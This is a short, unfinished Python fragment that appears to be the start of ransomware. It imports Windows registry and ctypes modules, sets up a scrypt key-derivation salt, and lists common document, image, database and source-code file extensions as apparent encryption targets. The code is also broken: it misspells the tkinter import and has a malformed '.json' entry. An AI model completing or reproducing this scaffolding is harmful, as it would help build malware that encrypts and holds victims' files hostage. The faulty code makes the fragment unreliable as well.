import os
import sys
import threading
import ctypes
import winreg
import tkinker as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

from pathlib import Path
import secrets

#generate encryption key...
salt = secrets.token_bytes(16)
#hash(password, salt, N=1<<14, r=8, p=1, buflen=64)


#file name ending thing list
file_suffixes = ['.txt', '.doc', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.zip', '.rar', '.7z', '.sql', '.db', '.cpp', '.py', '.html', '.css', '.js', ',json', '.xml', '.ppt', '.pptx']
